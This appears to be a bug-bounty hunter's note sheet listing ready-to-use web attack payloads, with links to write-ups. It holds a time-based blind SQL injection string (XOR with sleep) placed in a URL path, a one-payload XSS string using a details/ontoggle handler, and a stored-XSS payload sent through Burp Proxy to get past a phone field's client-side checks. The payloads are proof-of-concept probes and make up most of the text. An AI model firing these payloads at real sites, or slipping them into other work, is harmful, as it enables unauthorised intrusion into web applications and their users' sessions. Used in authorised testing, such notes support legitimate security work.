
https://sagarsajeev.medium.com/sensitive-data-exposure-via-403-forbidden-bypass-df9b4dcd0fd
https://medium.com/@mohameddhanish98/a-story-of-dom-xss-852b6ed3bb5f

--------------
Inject In Url Its Self Without any Parameter

Payload was Here
/0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/
as This In Url so We Have [Multiple SQL Injection] 

---------------------------------------------
xss Payloads:
<details++on+/ontoggle%3d1%5econfirm(document.domain)+open//

Test multiple XSS scenarios with ONE payload.  

https://pastebin.com/4zADMK1u
-----------------------------------------------
Bug: Stored XSS 

Tried to input XSS payload through proxy.

Phone Number Field-
Through Browser: Only Numeric Digits allowed (Alphabet and Special Characters Blocked)

Through Burp Proxy: 123"><svg+onload=prompt(document.domain)> (Stored XSS)
---------------------------------------------------------
